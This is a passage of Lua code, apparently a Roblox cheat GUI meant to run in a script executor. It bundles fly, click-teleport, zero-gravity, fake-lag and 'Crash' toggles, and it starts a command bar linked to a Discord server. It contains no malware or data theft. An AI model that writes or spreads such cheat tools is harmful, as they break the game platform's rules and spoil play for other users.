					while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
						game:GetService("RunService").RenderStepped:Wait()
	
						if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
							speed = speed+.5+(speed/maxspeed)
							if speed > maxspeed then
								speed = maxspeed
							end
						elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
							speed = speed-1
							if speed < 0 then
								speed = 0
							end
						end
						if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
							bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
							lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
						elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
							bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
						else
							bv.velocity = Vector3.new(0,0,0)
						end
						--	game.Players.LocalPlayer.Character.Animate.Disabled = true
						bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
					end
					ctrl = {f = 0, b = 0, l = 0, r = 0}
					lastctrl = {f = 0, b = 0, l = 0, r = 0}
					speed = 0
					bg:Destroy()
					bv:Destroy()
					plr.Character.Humanoid.PlatformStand = false
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					tpwalking = false
	
	
	
	
				else
					local plr = game.Players.LocalPlayer
					local UpperTorso = plr.Character.UpperTorso
					local flying = true
					local deb = true
					local ctrl = {f = 0, b = 0, l = 0, r = 0}
					local lastctrl = {f = 0, b = 0, l = 0, r = 0}
					local maxspeed = 50
					local speed = 0
	
	
					local bg = Instance.new("BodyGyro", UpperTorso)
					bg.P = 9e4
					bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
					bg.cframe = UpperTorso.CFrame
					local bv = Instance.new("BodyVelocity", UpperTorso)
					bv.velocity = Vector3.new(0,0.1,0)
					bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
					if nowe == true then
						plr.Character.Humanoid.PlatformStand = true
					end
					while nowe == true or game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0 do
						wait()
	
						if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
							speed = speed+.5+(speed/maxspeed)
							if speed > maxspeed then
								speed = maxspeed
							end
						elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
							speed = speed-1
							if speed < 0 then
								speed = 0
							end
						end
						if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
							bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
							lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
						elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
							bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
						else
							bv.velocity = Vector3.new(0,0,0)
						end
	
						bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
					end
					ctrl = {f = 0, b = 0, l = 0, r = 0}
					lastctrl = {f = 0, b = 0, l = 0, r = 0}
					speed = 0
					bg:Destroy()
					bv:Destroy()
					plr.Character.Humanoid.PlatformStand = false
					game.Players.LocalPlayer.Character.Animate.Disabled = false
					tpwalking = false
	
	
	
				end
	
	
	
	
	
			end)
	
			local tis
		end
		coroutine.wrap(SSWSNG_fake_script)()
		local function GYRIVDI_fake_script() -- tp.LocalScript 
			local script = Instance.new('LocalScript', tp)
	
			script.Parent.MouseButton1Click:Connect(function()
				mouse = game.Players.LocalPlayer:GetMouse()
				tool = Instance.new("Tool")
				tool.RequiresHandle = false
				tool.Name = "Click Teleport"
				tool.Activated:connect(function()
					local pos = mouse.Hit+Vector3.new(0,2.5,0)
					pos = CFrame.new(pos.X,pos.Y,pos.Z)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
				end)
				tool.Parent = game.Players.LocalPlayer.Backpack
			end)
		end
		coroutine.wrap(GYRIVDI_fake_script)()
		local function BCBQLZ_fake_script() -- floatingpad.LocalScript 
			local script = Instance.new('LocalScript', floatingpad)
	
			script.Parent.MouseButton1Click:Connect(function()
				local name = game.Players.LocalPlayer.Name
	
				local p = Instance.new("Part")
				p.Parent = workspace
				p.Locked = true
				p.Color = Color3.new(0.666667, 0, 0)
				p.Size = Vector3.new(8, 1.2, 8)
				p.Anchored = true
				local m = Instance.new("CylinderMesh")
				m.Scale = Vector3.new(1, 0.5, 1)
				m.Parent = p
				while true do
					p.CFrame = CFrame.new(game.Players:findFirstChild(name).Character.Torso.CFrame.x, game.Players:findFirstChild(name).Character.Torso.CFrame.y - 4, game.Players:findFirstChild(name).Character.Torso.CFrame.z)
					wait()
				end
			end)
		end
		coroutine.wrap(BCBQLZ_fake_script)()
		local function KXYQAXQ_fake_script() -- Frame.UIDrag 
			local script = Instance.new('LocalScript', Frame)
	
			-- Made by Real_IceyDev (@lceyDex) --
			-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
			local UIS = game:GetService('UserInputService')
			local frame = script.Parent
			local dragToggle = nil
			local dragSpeed = 0.25
			local dragStart = nil
			local startPos = nil
	
			local function updateInput(input)
				local delta = input.Position - dragStart
				local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
					startPos.Y.Scale, startPos.Y.Offset + delta.Y)
				game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
			end
	
			frame.InputBegan:Connect(function(input)
				if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
					dragToggle = true
					dragStart = input.Position
					startPos = frame.Position
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragToggle = false
						end
					end)
				end
			end)
	
			UIS.InputChanged:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
					if dragToggle then
						updateInput(input)
					end
				end
			end)
		end
		coroutine.wrap(KXYQAXQ_fake_script)()
		local function GEVXYR_fake_script() -- ScreenGui.notfication 
			local script = Instance.new('LocalScript', ScreenGui)
	
			wait(2)
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "now loaded lol";
				Text = "By FishNoobAhh";
				Icon = "";
				Duration = 10; 
				Button1 = "yes sirrr";
			})
		end
		coroutine.wrap(GEVXYR_fake_script)()
		local function PYIQX_fake_script() -- ScreenGui.messageload 
			local script = Instance.new('LocalScript', ScreenGui)
	
			if script.Parent.Enabled == true then
				local m = Instance.new("Message", game.Workspace)
				m.Text = "1x1x1x1 gui fe Loading..."
				wait(2)
				m:Destroy()
				script:Destroy()
			else
	
			end
		end
		coroutine.wrap(PYIQX_fake_script)()
	end)
end;
task.spawn(C_1b);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_1c()
local script = G2L["1c"];
	local ogtext = script.Parent.Text
	
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Text = "Executed"
		wait(1)
		script.Parent.Text = ogtext
	end)
end;
task.spawn(C_1c);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_1f()
local script = G2L["1f"];
	script.Parent.MouseButton1Click:Connect(function()
		local Players = game:GetService("Players")
		local TweenService = game:GetService("TweenService")
		local Workspace = game:GetService("Workspace")
	
		local player = Players.LocalPlayer
	
		local function addUICorner(inst, radius)
			local c = Instance.new("UICorner")
			c.CornerRadius = UDim.new(0, radius or 8)
			c.Parent = inst
		end
	
		local existing = player:WaitForChild("PlayerGui"):FindFirstChild("FakeLagGUI")
		if existing then existing:Destroy() end
	
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = "FakeLagGUI"
		screenGui.ResetOnSpawn = false
		screenGui.Parent = player:WaitForChild("PlayerGui")
	
		local loadBg = Instance.new("Frame", screenGui)
		loadBg.Size = UDim2.new(0, 300, 0, 30)
		loadBg.Position = UDim2.new(0.5, -150, 0.5, -15)
		loadBg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		addUICorner(loadBg, 8)
	
		local loadFill = Instance.new("Frame", loadBg)
		loadFill.Size = UDim2.new(0, 0, 1, 0)
		loadFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
		addUICorner(loadFill, 8)
	
		local loadTxt = Instance.new("TextLabel", loadBg)
		loadTxt.Size = UDim2.new(1,0,1,0)
		loadTxt.BackgroundTransparency = 1
		loadTxt.Text = "Loading Fake Lag..."
		loadTxt.TextColor3 = Color3.new(1,1,1)
		loadTxt.Font = Enum.Font.SourceSansBold
		loadTxt.TextSize = 18
	
		local badPingAnimId
		local badPingAnimIdR6 = "rbxassetid://967278155"
		local badPingAnimIdR15 = "rbxassetid://507777826"
	
		local char = player.Character
		if char then
			local hum = char:FindFirstChildOfClass("Humanoid")
			if hum then
				if hum.RigType == Enum.HumanoidRigType.R6 then
					badPingAnimId = badPingAnimIdR6
				else
					badPingAnimId = badPingAnimIdR15
				end
			end
		end
	
		TweenService:Create(loadFill, TweenInfo.new(2, Enum.EasingStyle.Linear), {Size = UDim2.new(1,0,1,0)}):Play()
		task.wait(2)
		loadBg:Destroy()
	
		local main = Instance.new("Frame")
		main.Name = "MainGUI"
		main.Size = UDim2.new(0, 300, 0, 460)
		main.Position = UDim2.new(0.5, -150, 0.5, -230)
		main.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		main.Active = true
		main.Draggable = true
		main.Visible = true
		main.Parent = screenGui
		addUICorner(main, 12)
	
		local closeBtn = Instance.new("TextButton", main)
		closeBtn.Size = UDim2.new(0,24,0,24)
		closeBtn.Position = UDim2.new(1,-30,0,6)
		closeBtn.BackgroundColor3 = Color3.fromRGB(200,50,50)
		closeBtn.Font = Enum.Font.SourceSansBold
		closeBtn.TextSize = 20
		closeBtn.TextColor3 = Color3.new(1,1,1)
		closeBtn.Text = "X"
		addUICorner(closeBtn,6)
		closeBtn.MouseButton1Click:Connect(function()
			screenGui:Destroy()
		end)
	
		local title = Instance.new("TextLabel", main)
		title.Size = UDim2.new(1, -20, 0, 28)
		title.Position = UDim2.new(0, 10, 0, 8)
		title.BackgroundTransparency = 1
		title.Font = Enum.Font.SourceSansBold
		title.TextSize = 22
		title.TextColor3 = Color3.new(1,1,1)
		title.Text = "Fake Lag GUI"
	
		local statusLbl = Instance.new("TextLabel", main)
		statusLbl.Size = UDim2.new(1,-20,0,24)
		statusLbl.Position = UDim2.new(0,10,0,40)
		statusLbl.BackgroundTransparency = 1
		statusLbl.Font = Enum.Font.SourceSans
		statusLbl.TextSize = 18
		statusLbl.TextColor3 = Color3.new(1,1,1)
		statusLbl.Text = "Speed: 1"
	
		local tipLbl = Instance.new("TextLabel", main)
		tipLbl.Size = UDim2.new(1,-20,0,20)
		tipLbl.Position = UDim2.new(0,10,0,60)
		tipLbl.BackgroundTransparency = 1
		tipLbl.Font = Enum.Font.SourceSansItalic
		tipLbl.TextSize = 14
		tipLbl.TextColor3 = Color3.fromRGB(150,255,150)
		tipLbl.Text = "hello man"
	
		local speedBox = Instance.new("TextBox", main)
		speedBox.Size = UDim2.new(1,-80,0,30)
		speedBox.Position = UDim2.new(0,10,0,85)
		speedBox.PlaceholderText = "Enter speed"
		speedBox.BackgroundColor3 = Color3.fromRGB(40,40,40)
		speedBox.TextColor3 = Color3.new(1,1,1)
		speedBox.Font = Enum.Font.SourceSans
		speedBox.TextSize = 18
		speedBox.Text = ""
		addUICorner(speedBox,6)
	
		local enterBtn = Instance.new("TextButton", main)
		enterBtn.Size = UDim2.new(0,60,0,30)
		enterBtn.Position = UDim2.new(1,-70,0,85)
		enterBtn.Text = "Set"
		enterBtn.Font = Enum.Font.SourceSansBold
		enterBtn.TextSize = 18
		enterBtn.BackgroundColor3 = Color3.fromRGB(70,70,70)
		enterBtn.TextColor3 = Color3.new(1,1,1)
		addUICorner(enterBtn,6)
	
		local scroll = Instance.new("ScrollingFrame", main)
		scroll.Size = UDim2.new(1,-20,0,220)
		scroll.Position = UDim2.new(0,10,0,130)
		scroll.CanvasSize = UDim2.new(0,0,0,400)
		scroll.BackgroundColor3 = Color3.fromRGB(20,20,20)
		scroll.ScrollBarThickness = 6
		addUICorner(scroll,6)
	
		local buttons = {}
		local buttonNames = {"Bad Ping","Fake Lag","Crash"}
		for i,name in ipairs(buttonNames) do
			local btn = Instance.new("TextButton", scroll)
			btn.Size = UDim2.new(1,-20,0,40)
			btn.Position = UDim2.new(0,10,0,10 + (i-1)*50)
			btn.Text = name..": OFF"
			btn.Font = Enum.Font.SourceSansBold
			btn.TextSize = 18
			btn.TextColor3 = Color3.new(1,1,1)
			btn.BackgroundColor3 = Color3.fromRGB(60,60,60)
			addUICorner(btn,6)
			buttons[name] = btn
		end
	
		local activeMode = nil
		local savedSpeeds = {["Bad Ping"]=1, ["Fake Lag"]=1, ["Crash"]=1}
		local lagOn = false
		local lagLoop
		local lagSpeed = 1
		local crashOn = false
		local crashAnimTrack
		local defaultTip = "hello man"
	
		local function playRunAnim(hum)
			for _, track in ipairs(hum:GetPlayingAnimationTracks()) do
				track:Stop()
				track:Destroy()
			end
	
			local anim = Instance.new("Animation")
			anim.AnimationId = badPingAnimId
	
			local track
			if hum.RigType == Enum.HumanoidRigType.R6 then
				hum.PlatformStand = false
				track = hum:LoadAnimation(anim)
			else
				local animator = hum:FindFirstChildOfClass("Animator")
				if not animator then
					animator = Instance.new("Animator")
					animator.Parent = hum
				end
				track = animator:LoadAnimation(anim)
			end
	
			track:Play()
			return track
		end
	
		local function updateButtonStates()
			for name,btn in pairs(buttons) do
				if (activeMode == name and lagOn) or (name=="Crash" and crashOn) then
					btn.Text = name..": ON"
					btn.BackgroundColor3 = Color3.fromRGB(100,200,100)
				else
					btn.Text = name..": OFF"
					btn.BackgroundColor3 = Color3.fromRGB(60,60,60)
				end
			end
		end
	
		local function badPingLoop()
			local wasMoving = false
			while lagOn and activeMode == "Bad Ping" do
				local char = player.Character
				local hum = char and char:FindFirstChildOfClass("Humanoid")
				local root = char and char:FindFirstChild("HumanoidRootPart")
				if hum and root then
					if hum.MoveDirection.Magnitude > 0 then
						wasMoving = true
					elseif wasMoving and hum.MoveDirection.Magnitude == 0 then
						wasMoving = false
						local oldWS, oldJP = hum.WalkSpeed, hum.JumpPower
						hum.WalkSpeed, hum.JumpPower = 0,0
						local runAnim = playRunAnim(hum)
						task.wait(0.5)
						root.CFrame = root.CFrame + (root.CFrame.LookVector * (savedSpeeds["Bad Ping"] or 1))
						task.wait(1.5)
						if runAnim then runAnim:Stop(); runAnim:Destroy() end
						hum.WalkSpeed, hum.JumpPower = oldWS, oldJP
					end
				end
				task.wait(0.2)
			end
		end
	
		local function fakeLagLoop()
			while lagOn and activeMode == "Fake Lag" do
				local char = player.Character
				if char and char:FindFirstChild("HumanoidRootPart") then
					local root = char.HumanoidRootPart
					local internalSpeed = (savedSpeeds["Fake Lag"] or 1) + 5
					local freezeTime = math.clamp(0.8 / internalSpeed, 0.05, 0.8)
					local unfreezeTime = math.clamp(0.2 / internalSpeed, 0.05, 0.5)
					root.Anchored = true
					task.wait(freezeTime)
					root.Anchored = false
					task.wait(unfreezeTime)
				else
					task.wait(0.2)
				end
			end
		end
	
		local function toggleCrash()
			crashOn = not crashOn
			local char = player.Character
			local hum = char and char:FindFirstChildOfClass("Humanoid")
			local root = char and char:FindFirstChild("HumanoidRootPart")
			if crashOn and hum and root then
				local animator = hum:FindFirstChildOfClass("Animator")
				if animator and #animator:GetPlayingAnimationTracks() > 0 then
					local currentTrack = animator:GetPlayingAnimationTracks()[1]
					if currentTrack then
						local anim = Instance.new("Animation")
						anim.AnimationId = currentTrack.Animation.AnimationId
						crashAnimTrack = animator:LoadAnimation(anim)
						crashAnimTrack.Looped = true
						crashAnimTrack:Play()
						crashAnimTrack:AdjustSpeed(savedSpeeds["Crash"] or 1)
						root.Anchored = true
					end
				end
			else
				if crashAnimTrack then crashAnimTrack:Stop(); crashAnimTrack:Destroy() end
				if root then root.Anchored = false end
			end
			updateButtonStates()
		end
	
		local function toggleMode(mode)
			if mode == "Crash" then
				toggleCrash()
				return
			end
			if activeMode == mode and lagOn then
				if mode == "Bad Ping" then
					local char = player.Character
					local root = char and char:FindFirstChild("HumanoidRootPart")
					if root then
						repeat task.wait(0.1) until root.Velocity.Magnitude < 0.1
					end
				end
				if lagLoop then task.cancel(lagLoop) end
				local char = player.Character
				if char and char:FindFirstChild("HumanoidRootPart") then
					char.HumanoidRootPart.Anchored = false
				end
				lagOn = false
				updateButtonStates()
				tipLbl.Text = defaultTip
			else
				activeMode = mode
				tipLbl.Text = mode
				lagSpeed = savedSpeeds[mode] or 1
				statusLbl.Text = "Speed: " .. lagSpeed
				lagOn = true
				updateButtonStates()
				if mode == "Bad Ping" then
					lagLoop = task.spawn(badPingLoop)
				elseif mode == "Fake Lag" then
					lagLoop = task.spawn(fakeLagLoop)
				end
			end
		end
	
		for name,btn in pairs(buttons) do
			btn.MouseButton1Click:Connect(function()
				toggleMode(name)
			end)
		end
	
		enterBtn.MouseButton1Click:Connect(function()
			if activeMode then
				local num = tonumber(speedBox.Text)
				if num and num > 0 then
					savedSpeeds[activeMode] = num
					lagSpeed = num
					statusLbl.Text = "Speed: "..num
					if activeMode == "Crash" and crashAnimTrack then
						crashAnimTrack:AdjustSpeed(num)
					end
				else
					statusLbl.Text = "Invalid number!"
				end
			end
		end)
	end)
end;
task.spawn(C_1f);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_20()
local script = G2L["20"];
	local ogtext = script.Parent.Text
	
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Text = "Executed"
		wait(1)
		script.Parent.Text = ogtext
	end)
end;
task.spawn(C_20);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_22()
local script = G2L["22"];
	local ogtext = script.Parent.Text
	
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Parent.Parent.ScreenGui:Destroy()
	end)
end;
task.spawn(C_22);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_24()
local script = G2L["24"];
	local ogtext = script.Parent.Text
	
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Text = "Executed"
		wait(1)
		script.Parent.Text = ogtext
	end)
end;
task.spawn(C_24);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_25()
local script = G2L["25"];
	script.Parent.MouseButton1Click:Connect(function()
		-- skid? Your welcome!
		-- skid? Your welcome!
		-- skid? Your welcome!
		-- skid? Your welcome!
		-- skid? Your welcome!
		-- skid? Your welcome!
		-- skid? Your welcome!
		-- skid? Your welcome!
		-- skid? Your welcome!
		-- skid? Your welcome!
	
	--[[
	  _                        __                                             _       _       
	 | |                      / /                                            (_)     | |      
	 | |_   _ __ ___   ___   / /_ _ _ __ ___ ___ _   _ _____  _____  ___ _ __ _ _ __ | |_ ___ 
	 | __| | '_ ` _ \ / _ \ / / _` | '__/ __/ _ \ | | / __\ \/ / __|/ __| '__| | '_ \| __/ __|
	 | |_ _| | | | | |  __// / (_| | | | (_|  __/ |_| \__ \>  <\__ \ (__| |  | | |_) | |_\__ \
	  \__(_)_| |_| |_|\___/_/ \__,_|_|  \___\___|\__,_|___/_/\_\___/\___|_|  |_| .__/ \__|___/
	                                                                           | |            
	                                                                           |_|            
	]]
	
		local gui = Instance.new("ScreenGui")
		local main = Instance.new("Frame")
		local label = Instance.new("TextLabel")
		local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
		local button = Instance.new("TextButton")
		local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
	
		gui.Name = "gui"
		gui.Parent = gethui()
		gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	
		main.Name = "main"
		main.Parent = gui
		main.BackgroundColor3 = Color3.fromRGB(72, 72, 72)
		main.BorderColor3 = Color3.fromRGB(0, 0, 0)
		main.BorderSizePixel = 0
		main.Position = UDim2.new(0.196095973, 0, 0.556803584, 0)
		main.Size = UDim2.new(0.178187668, 0, 0.13960205, 0)
		main.Active = true
		main.Draggable = true
	
		label.Name = "label"
		label.Parent = main
		label.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
		label.BorderColor3 = Color3.fromRGB(0, 0, 0)
		label.BorderSizePixel = 0
		label.Size = UDim2.new(1, 0, 0.294736832, 0)
		label.Font = Enum.Font.Gotham
		label.Text = "Zero Gravity"
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextScaled = true
		label.TextSize = 29.000
		label.TextWrapped = true
	
		UITextSizeConstraint.Parent = label
		UITextSizeConstraint.MaxTextSize = 29
	
		button.Name = "button"
		button.Parent = main
		button.BackgroundColor3 = Color3.fromRGB(108, 108, 108)
		button.BorderColor3 = Color3.fromRGB(0, 0, 0)
		button.BorderSizePixel = 0
		button.Position = UDim2.new(0.0526315793, 0, 0.438756049, 0)
		button.Size = UDim2.new(0.894736826, 0, 0.431578934, 0)
		button.Font = Enum.Font.Gotham
		button.Text = "Click"
		button.TextColor3 = Color3.fromRGB(255, 255, 255)
		button.TextSize = 24.000
		button.TextScaled = true
		button.TextWrapped = true
	
		UITextSizeConstraint_2.Parent = button
		UITextSizeConstraint_2.MaxTextSize = 31
	
		-- Scripts:
	
		local plr = game:GetService("Players").LocalPlayer
		local normalGravity = workspace.Gravity
	
		local function MUBRZ_fake_script() -- button.script 
			local script = Instance.new('LocalScript', button)
	
			script.Parent.MouseButton1Click:Connect(function()
				workspace.Gravity = 0
	
				local humanoid = plr.Character:FindFirstChildWhichIsA("Humanoid")
				humanoid.Sit = true
				task.wait(0.1)
				humanoid.RootPart.CFrame = humanoid.RootPart.CFrame * CFrame.Angles(math.pi * 0.5, 0, 0)
				for _, v in ipairs(humanoid:GetPlayingAnimationTracks()) do
					v:Stop()
				end
			end)
	
			game:GetService("UserInputService").JumpRequest:Connect(function()
				workspace.Gravity = normalGravity
			end)
		end
		coroutine.wrap(MUBRZ_fake_script)()
	end)
end;
task.spawn(C_25);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_27()
local script = G2L["27"];
	local ogtext = script.Parent.Text
	
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Text = "Executed"
		wait(1)
		script.Parent.Text = ogtext
	end)
end;
task.spawn(C_27);
-- StarterGui.ScreenGui.Frame1.TextButton.LocalScript
local function C_28()
local script = G2L["28"];
	script.Parent.MouseButton1Click:Connect(function()
		-- Discord server for working games: https://discord.gg/quirkycmd
	
		-- Made by Cynatica
	
		-- QuirkyCMD on Top!
	
	
		local cloneref = cloneref or function(a) return a end
		local coreGui = cloneref(game:GetService("CoreGui"))
		local players = cloneref(game:GetService("Players"))
		local localPlayer = players.LocalPlayer
	
		local function isElevatedStudioPlugin()
			local s, r = pcall(function()
				return coreGui:GetChildren()
			end)
			return s
		end
	
		local gethui = gethui or function()
			local folder
			if isElevatedStudioPlugin() then
				if coreGui:WaitForChild("RobloxGui"):FindFirstChild(".__gethui") then
					folder = coreGui:WaitForChild("RobloxGui"):FindFirstChild(".__gethui")
				else
					folder = Instance.new("Folder")
					folder.Name = '.__gethui'
					folder.Parent = coreGui:WaitForChild("RobloxGui")
				end
			else
				folder = localPlayer:WaitForChild'PlayerGui'
			end
			return folder
		end
	
		-- Instances:
	
		local quirkyCMD = Instance.new("ScreenGui")
		local main = Instance.new("Frame")
		local menu = Instance.new("ImageButton")
		local cmdBox = Instance.new("TextBox")
		local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
		local UICorner = Instance.new("UICorner")
		local UICorner_2 = Instance.new("UICorner")
		local remotepath = Instance.new("TextLabel")
		local UICorner_3 = Instance.new("UICorner")
		local mobileOpen = Instance.new("TextButton")
		local UICorner_4 = Instance.new("UICorner")
		local cmds = Instance.new("Frame")
		local UICorner_5 = Instance.new("UICorner")
		local closeButton = Instance.new("TextButton")
		local UICorner_6 = Instance.new("UICorner")
		local cmdList = Instance.new("ScrollingFrame")
		local UIListLayout = Instance.new("UIListLayout")
		local template = Instance.new("TextLabel")
		local UIGradient = Instance.new("UIGradient")
		local UICorner_7 = Instance.new("UICorner")
	
		--Properties:
	
		quirkyCMD.Name = "quirkyCMD"
		quirkyCMD.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
		quirkyCMD.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		quirkyCMD.ResetOnSpawn = false
	
		main.Name = "main"
		main.Parent = quirkyCMD
		main.AnchorPoint = Vector2.new(0.5, 0.5)
		main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		main.BorderColor3 = Color3.fromRGB(0, 0, 0)
		main.BorderSizePixel = 0
		main.Position = UDim2.new(0.5, 0, 0.5, 0)
		main.Size = UDim2.new(0, 250, 0, 40)
	
		menu.Name = "menu"
		menu.Parent = main
		menu.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		menu.BackgroundTransparency = 1.000
		menu.BorderColor3 = Color3.fromRGB(0, 0, 0)
		menu.BorderSizePixel = 0
		menu.Position = UDim2.new(0.811999977, 0, 0.125, 0)
		menu.Size = UDim2.new(0, 27, 0, 30)
		menu.Image = "rbxassetid://73467005156187"
		menu.ImageColor3 = Color3.fromRGB(153, 153, 153)
	
		cmdBox.Name = "cmdBox"
		cmdBox.Parent = main
		cmdBox.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
		cmdBox.BackgroundTransparency = 0.800
		cmdBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
		cmdBox.BorderSizePixel = 0
		cmdBox.Position = UDim2.new(0.163999751, 0, 0, 0)
		cmdBox.Size = UDim2.new(0.588, 0, 0.999999642, 0)
		cmdBox.Font = Enum.Font.SourceSansBold
		cmdBox.PlaceholderColor3 = Color3.fromRGB(103, 103, 103)
		cmdBox.PlaceholderText = "QuirkyCMD loaded"
		cmdBox.Text = ""
		cmdBox.TextColor3 = Color3.fromRGB(103, 103, 103)
		cmdBox.TextScaled = true
		cmdBox.TextSize = 12.000
		cmdBox.TextWrapped = true
	
		UITextSizeConstraint.Parent = cmdBox
		UITextSizeConstraint.MaxTextSize = 18
	
		UICorner.CornerRadius = UDim.new(0, 20)
		UICorner.Parent = cmdBox
	
		UICorner_2.CornerRadius = UDim.new(0, 16)
		UICorner_2.Parent = main
	
		remotepath.Name = "remotepath"
		remotepath.Parent = quirkyCMD
		remotepath.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		remotepath.BackgroundTransparency = 0.600
		remotepath.BorderColor3 = Color3.fromRGB(0, 0, 0)
		remotepath.BorderSizePixel = 0
		remotepath.Position = UDim2.new(0.395616412, 0, 0.249097273, 0)
		remotepath.Size = UDim2.new(0.208000004, 0, 0.0439999998, 0)
		remotepath.Text = ""
		remotepath.TextColor3 = Color3.fromRGB(255, 255, 255)
		remotepath.TextScaled = true
		remotepath.TextSize = 14.000
		remotepath.TextTransparency = 0.600
		remotepath.TextWrapped = true
	
		UICorner_3.CornerRadius = UDim.new(0.400000006, 0)
		UICorner_3.Parent = remotepath
	
		mobileOpen.Name = "mobileOpen"
		mobileOpen.Parent = quirkyCMD
		mobileOpen.AnchorPoint = Vector2.new(1, 0)
		mobileOpen.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
		mobileOpen.BorderColor3 = Color3.fromRGB(0, 0, 0)
		mobileOpen.BorderSizePixel = 0
		mobileOpen.Position = UDim2.new(0.999999821, 0, 0.293097287, 0)
		mobileOpen.Selectable = false
		mobileOpen.Size = UDim2.new(0.056456618, 0, 0.0343623683, 0)
		mobileOpen.Visible = false
		mobileOpen.Font = Enum.Font.SourceSansBold
		mobileOpen.Text = "CMD"
		mobileOpen.TextColor3 = Color3.fromRGB(200, 200, 200)
		mobileOpen.TextScaled = true
		mobileOpen.TextSize = 14.000
		mobileOpen.TextWrapped = true
	
		UICorner_4.CornerRadius = UDim.new(1, 1)
		UICorner_4.Parent = mobileOpen
	
		cmds.Name = "cmds"
		cmds.Parent = quirkyCMD
		cmds.Active = true
		cmds.AnchorPoint = Vector2.new(0.5, 0.5)
		cmds.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		cmds.BorderColor3 = Color3.fromRGB(0, 0, 0)
		cmds.BorderSizePixel = 0
		cmds.Position = UDim2.new(0.5, 0, 0.5, 0)
		cmds.Size = UDim2.new(0.0883912593, 0, 0.287559688, 0)
		cmds.Visible = false
	
		UICorner_5.CornerRadius = UDim.new(0, 16)
		UICorner_5.Parent = cmds
	
		closeButton.Name = "closeButton"
